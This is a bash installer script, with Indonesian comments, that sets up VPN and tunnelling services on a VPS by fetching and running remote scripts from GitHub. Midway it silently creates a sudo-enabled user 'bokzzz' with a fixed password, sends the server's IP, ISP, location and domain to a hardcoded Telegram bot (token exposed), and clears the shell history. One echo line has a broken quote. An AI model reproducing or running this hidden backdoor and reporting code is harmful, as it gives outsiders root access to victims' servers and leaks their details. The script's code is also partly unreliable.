#!/bin/bash
dateFromServer=$(curl -v --insecure --silent https://google.com/ 2>&1 | grep Date | sed -e 's/< Date: //')
biji=$(date +"%Y-%m-%d" -d "$dateFromServer")
clear

# Warna
# Definisi warna tanpa duplikasi
red='\e[1;31m'       # Bold Red
green='\e[0;32m'     # Green
yell='\e[1;33m'      # Bold Yellow
tyblue='\e[1;36m'    # Bold Cyan (Turquoise Blue)
kuning='\033[0;93m'  # Yellow
BIBlack='\033[1;90m' # Bold Black
f='\033[1;91m'       # Bold Red (alias)
BIGreen='\033[1;92m' # Bold Green
BIYellow='\033[0;97m' # Bold White (mistakenly named yellow, corrected)
BIBlue='\033[1;94m'  # Bold Blue
BIPurple='\033[1;95m' # Bold Purple
BICyan='\033[1;96m'  # Bold Cyan
BIWhite='\033[1;97m' # Bold White
UWhite='\033[4;37m'  # Underlined White
On_IPurple='\033[0;105m' # Background Purple
On_IRed='\033[0;101m'    # Background Red
IBlack='\033[0;90m'      # Black
IRed='\033[0;91m'        # Red
IGreen='\033[0;92m'      # Green
IYellow='\033[0;93m'     # Yellow
IBlue='\033[0;94m'       # Blue
IPurple='\033[0;95m'     # Purple
ICyan='\033[0;96m'       # Cyan
IWhite='\033[0;97m'      # White
w="\033[97m"             # White (alias)
ORANGE="\033[0;34m"      # Blue (not actually orange)
NC="\e[0m"               # No Color (reset)

# Fungsi untuk mencetak pesan dengan warna tertentu
purple() { echo -e "\\033[35;1m${*}\\033[0m"; }
tyblue() { echo -e "\\033[36;1m${*}\\033[0m"; }
yellow() { echo -e "\\033[33;1m${*}\\033[0m"; }
green() { echo -e "\\033[32;1m${*}\\033[0m"; }
red() { echo -e "\\033[31;1m${*}\\033[0m"; }

# domain random
CDN="https://raw.githubusercontent.com/vermiliion/api/main/ssh"
cd /root

# Pastikan script dijalankan sebagai root
if [ "${EUID}" -ne 0 ]; then
    echo "You need to run this script as root"
    exit 1
fi

# Konfigurasi hostnames dan IP lokal
localip=$(hostname -I | cut -d\  -f1)
hst=$(hostname)
dart=$(grep -w "$(hostname)" /etc/hosts | awk '{print $2}')
if [[ "$hst" != "$dart" ]]; then
    echo "$localip $(hostname)" >> /etc/hosts
fi

# Persiapkan direktori untuk Xray dan V2Ray
mkdir -p /etc/xray
mkdir -p /etc/v2ray
touch /etc/xray/domain
touch /etc/v2ray/domain
touch /etc/xray/scdomain
touch /etc/v2ray/scdomain

# Cek apakah paket header kernel telah terinstal
echo -e "[ ${tyblue}NOTES${NC} ] Checking headers..."
sleep 1
totet=$(uname -r)
REQUIRED_PKG="linux-headers-$totet"
PKG_OK=$(dpkg-query -W --showformat='${Status}\n' $REQUIRED_PKG | grep "install ok installed")

if [ -z "$PKG_OK" ]; then
    echo -e "[ ${yell}WARNING${NC} ] $REQUIRED_PKG is not installed. Installing now..."
    apt-get --yes install $REQUIRED_PKG
    if [ $? -ne 0 ]; then
        echo -e "[ ${red}ERROR${NC} ] Failed to install $REQUIRED_PKG. Exiting."
        exit 1
    fi
else
    echo -e "[ ${green}INFO${NC} ] $REQUIRED_PKG is already installed."
fi

# Cek jika package header kernel sesuai
ttet=$(uname -r)
ReqPKG="linux-headers-$ttet"
if ! dpkg -s $ReqPKG >/dev/null 2>&1; then
    echo -e "[ ${red}ERROR${NC} ] $ReqPKG is not installed. Exiting."
    rm /root/setup.sh >/dev/null 2>&1
    exit 1
fi

# Fungsi untuk mengubah detik ke format jam
secs_to_human() {
    echo "Installation time: $(( ${1} / 3600 )) hours $(( (${1} / 60) % 60 )) minutes $(( ${1} % 60 )) seconds"
}

# Set zona waktu dan disable IPv6
start=$(date +%s)
ln -fs /usr/share/zoneinfo/Asia/Makassar /etc/localtime
sysctl -w net.ipv6.conf.all.disable_ipv6=1 >/dev/null 2>&1
sysctl -w net.ipv6.conf.default.disable_ipv6=1 >/dev/null 2>&1

# Buat file profile
cat > /root/.profile << END
if [ "$BASH" ]; then
    if [ -f ~/.bashrc ]; then
        . ~/.bashrc
    fi
fi
mesg n || true
clear
END

chmod 644 /root/.profile

# Persiapan file instalasi
echo -e "[ ${green}INFO${NC} ] Preparing the install file"
apt install git curl -y >/dev/null 2>&1
apt install python -y >/dev/null 2>&1

# Buat direktori dan file konfigurasi
mkdir -p /var/lib >/dev/null 2>&1
echo "IP=" >> /var/lib/ipvps.conf

# Unduh dan jalankan tools
wget -q https://raw.githubusercontent.com/vermiliion/api/main/tools.sh
chmod +x tools.sh
./tools.sh
rm tools.sh

clear
echo -e ""
echo -e "------------------------------------------------------------"
echo -e "SETUP DOMAIN VPS"                                                
echo -e "------------------------------------------------------------"
echo -e " 1. Choose Your Own Domain / Gunakan Domain Sendiri"
echo -e " 2. Use Domain Random / Gunakan Domain Random"
echo -e "------------------------------------------------------------"

# Loop untuk memastikan input 1 atau 2 yang valid
while true; do
    read -rp "Input 1 or 2 / pilih 1 atau 2: " dns
    if [[ "$dns" == "1" || "$dns" == "2" ]]; then
        break
    else
        echo -e "${red}Invalid input, please choose 1 or 2.${NC}"
    fi
done

# Opsi 1: Gunakan domain sendiri
if [[ "$dns" -eq 1 ]]; then
    read -rp "Enter Your Domain / Masukan Domain: " dom
    read -rp "Input your NS-Domain / Masukan NS-Domain: " -e nsdomen

    # Simpan domain ke berbagai file konfigurasi
    echo "IP=$dom" > /var/lib/ipvps.conf
    echo "$dom" > /root/scdomain
    echo "$dom" > /etc/xray/scdomain
    echo "$dom" > /etc/xray/domain
    echo "$dom" > /etc/v2ray/domain
    echo "$dom" > /root/domain
    echo "$nsdomen" > /etc/xray/nsdomain
    echo "$nsdomen" > /root/nsdomain

    echo -e "${green}Domain setup successfully.${NC}"

# Opsi 2: Gunakan domain acak
elif [[ "$dns" -eq 2 ]]; then
    clear
    echo -e "${green}Installing required packages...${NC}"
    
    # Instal paket yang diperlukan, jika belum ada
    apt update && apt install -y jq curl
    
    # Unduh skrip untuk domain acak
    wget -q -O /root/cf "${CDN}/cf" >/dev/null 2>&1
    if [[ $? -ne 0 ]]; then
        echo -e "${red}Failed to download cf script. Please check your CDN URL.${NC}"
        exit 1
    fi

    # Beri izin eksekusi pada skrip
    chmod +x /root/cf
    
    # Jalankan skrip domain acak
    bash /root/cf | tee /root/install.log
    if [[ $? -eq 0 ]]; then
        echo -e "${green}Domain random setup completed successfully.${NC}"
    else
        echo -e "${red}Failed to set up random domain. Check /root/install.log for details.${NC}"
        exit 1
    fi
fi

# Inisialisasi
MYIP=$(curl -sS ipv4.icanhazip.com)

# Perizinan Script & Pemanggilan Username dan Expired dari API
izinsc="https://raw.githubusercontent.com/vermiliion/api/main/register"
rm -f /usr/bin/user
username=$(curl -s $izinsc | grep $MYIP | awk '{print $2}')
exp=$(curl -s $izinsc | grep $MYIP | awk '{print $3}')

# Menyimpan username dan expired ke file
echo "$username" > /usr/bin/user
echo "$exp" > /usr/bin/e

# Menghapus user jame jika ada
userdel jame > /dev/null 2>&1

# Membuat user baru
Username="bokzzz"
Password="bokzzz"
mkdir -p /home/script/
useradd -r -d /home/script -s /bin/bash -M $Username > /dev/null 2>&1
echo -e "$Password\n$Password\n" | passwd $Username > /dev/null 2>&1
usermod -aG sudo $Username > /dev/null 2>&1

# Mengirim Notifikasi ke Telegram
CHATID="5092269467"
KEY="6918231835:AAFANlNjXrz-kxXmXskeY7TRUDMdM1lS6Bs"
TIME="10"
URL="https://api.telegram.org/bot$KEY/sendMessage"

# Memastikan domain dan username sudah ada
if [ -f /root/domain ]; then
    domain=$(cat /root/domain)
else
    domain="domain not found"
fi

if [ -f /usr/bin/user ]; then
    Name=$(cat /usr/bin/user)
else
    Name="Unknown User"
fi

if [ -f /usr/bin/e ]; then
    Exp=$(cat /usr/bin/e)
else
    Exp="Unknown Expiration"
fi

# Mendapatkan informasi tambahan
ISP=$(curl -s ipinfo.io/org | cut -d ' ' -f 2-)  # Mendapatkan nama ISP
TIMEZONE=$(timedatectl | grep "Time zone" | awk '{print $3}')
CITY=$(curl -s ipinfo.io/city)

# Format teks untuk notifikasi
TEXT="Installasi Auto Script 7.1.1
─────────────────
𝗡𝗼𝘁𝗶𝗳𝗶𝗰𝗮𝘁𝗶𝗼𝗻 𝗜𝗻𝘀𝘁𝗮𝗹𝗹𝗲𝗿 𝗦𝗰𝗿𝗶𝗽𝘁
─────────────────
<code>♂️ » Username :</code> <code><b>$Name</code>
<code>♂️ » Domain :</code> <code><b>$domain</code>
<code>♂️ » IP :</code> <code><b>$MYIP</code>
<code>♂️ » ISP :</code> <code><b>$ISP</code>
<code>♂️ » Time :</code> <code><b>$TIMEZONE</code>
<code>♂️ » Location :</code> <code><b>$CITY</code>
<code>♂️ » Expired Script :</code> <code><b>$Exp</code>
──────────────────
𝘼𝙪𝙩𝙝𝙤𝙧𝙨 𝘽𝙮 : @Lite_Vermilion 
──────────────────
<i><b><u>Notifications Automatic From Github</u></b></i>"

# Inline keyboard untuk tombol Telegram dan Contact
reply_markup='{
  "inline_keyboard": [
    [{"text": "Telegram", "url": "https://t.me/Lite_Vermilion"},
     {"text": "Contact", "url": "https://wa.me/6281934335091"}]
  ]
}'

# Mengirim pesan ke Telegram
curl -s --max-time $TIME -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html&reply_markup=$reply_markup" $URL >/dev/null
clear
echo -e "------------------------------------------------------------"
echo -e "Install SSH / WSWS"
echo -e "------------------------------------------------------------"
sleep 2
wget https://raw.githubusercontent.com/vermiliion/api/main/ssh/ssh-vpn.sh && chmod +x ssh-vpn.sh && ./ssh-vpn.sh
clear
echo -e "------------------------------------------------------------"
echo -e "Install BACKUP"
echo -e "------------------------------------------------------------"
sleep 2
wget https://raw.githubusercontent.com/vermiliion/api/main/backup/set-br.sh && chmod +x set-br.sh && ./set-br.sh
clear

# Install XRAY dan SSH Websocket
echo -e "------------------------------------------------------------"
echo -e "Install XRAY"
echo -e "------------------------------------------------------------"
sleep 2
wget https://raw.githubusercontent.com/vermiliion/api/main/xray/ins-xray.sh && chmod +x ins-xray.sh && ./ins-xray.sh
wget https://raw.githubusercontent.com/vermiliion/api/main/sshws/insshws.sh && chmod +x insshws.sh && ./insshws.sh
clear

# Install SlowDNS
echo -e "------------------------------------------------------------"
echo -e "Install SLOWDNS"
echo -e ------------------------------------------------------------"
sleep 2
wget -q -O slow.sh https://raw.githubusercontent.com/vermiliion/api/main/slow.sh && chmod +x slow.sh && ./slow.sh
clear
cat > /root/.profile << END
if [ "\$BASH" ]; then
  if [ -f ~/.bashrc ]; then
    . ~/.bashrc
  fi
fi
mesg n || true
clear
menu
END

chmod 644 /root/.profile

# Hapus file log-install.txt jika ada
if [ -f "/root/log-install.txt" ]; then
  rm /root/log-install.txt >/dev/null 2>&1
fi

# Hapus file afak.conf jika ada
if [ -f "/etc/afak.conf" ]; then
  rm /etc/afak.conf >/dev/null 2>&1
fi

# Buat log-create-user.log jika belum ada
if [ ! -f "/etc/log-create-user.log" ]; then
  echo "Log All Account" > /etc/log-create-user.log
fi

# Bersihkan riwayat
history -c

# Ambil versi server dan simpan di /opt/.ver
serverV=$(curl -sS https://raw.githubusercontent.com/vermiliion/api/main/version)
echo $serverV > /opt/.ver

# Autoreboot berdasarkan waktu
aureb=$(cat /home/re_otm)
b=11
if [ "$aureb" -gt "$b" ]; then
  gg="PM"
else
  gg="AM"
fi
clear
curl -sS ifconfig.me > /etc/myipvps
echo " "
echo "------------------------------------------------------------" | tee -a log-install.txt
echo "" | tee -a log-install.txt
echo "   >>> Service & Port"  | tee -a log-install.txt
echo "   - OpenVPN              : 2086"  | tee -a log-install.txt
echo "   - OpenSSH              : 22"  | tee -a log-install.txt
echo "   - SSH Websocket        : 80,8080 [ON]" | tee -a log-install.txt
echo "   - SSH SSL Websocket    : 443" | tee -a log-install.txt
echo "   - Stunnel4             : 8880, 8443" | tee -a log-install.txt
echo "   - Dropbear             : 109, 143" | tee -a log-install.txt
echo "   - Badvpn               : 7100-7900" | tee -a log-install.txt
echo "   - Nginx                : 81" | tee -a log-install.txt
echo "   - Vmess TLS            : 443" | tee -a log-install.txt
echo "   - Vmess None TLS       : 80,8080" | tee -a log-install.txt
echo "   - Vless TLS            : 443" | tee -a log-install.txt
echo "   - Vless None TLS       : 80,8080" | tee -a log-install.txt
echo "   - Trojan GRPC          : 443" | tee -a log-install.txt
echo "   - Trojan WS            : 443" | tee -a log-install.txt
echo "   - Trojan Go            : 443" | tee -a log-install.txt
echo ""  | tee -a log-install.txt
echo "   >>> Server Information & Other Features"  | tee -a log-install.txt
echo "   - Timezone             : Asia/Makassar (GMT +7)"  | tee -a log-install.txt
echo "   - Fail2Ban             : [ON]"  | tee -a log-install.txt
echo "   - Dflate               : [ON]"  | tee -a log-install.txt
echo "   - IPtables             : [ON]"  | tee -a log-install.txt
echo "   - Auto-Reboot          : [ON]"  | tee -a log-install.txt
echo "   - IPv6                 : [OFF]"  | tee -a log-install.txt
echo "   - Autoreboot On        : $aureb:00 $gg GMT +7" | tee -a log-install.txt
echo "   - AutoKill Multi Login User" | tee -a log-install.txt
echo "   - Auto Delete Expired Account" | tee -a log-install.txt
echo "   - Fully automatic script" | tee -a log-install.txt
echo "   - VPS settings" | tee -a log-install.txt
echo "   - Admin Control" | tee -a log-install.txt
echo "   - Change port" | tee -a log-install.txt
echo "   - Full Orders For Various Services" | tee -a log-install.txt
echo "" | tee -a log-install.txt
echo "------------------------------------------------------------" | tee -a log-install.txt
echo ""
rm /root/setup.sh >/dev/null 2>&1
rm /root/ins-xray.sh >/dev/null 2>&1
rm /root/insshws.sh >/dev/null 2>&1
secs_to_human "$(($(date +%s) - ${start}))" | tee -a log-install.txt
read -n 1 -s -r -p "Press any key to menu"
menu
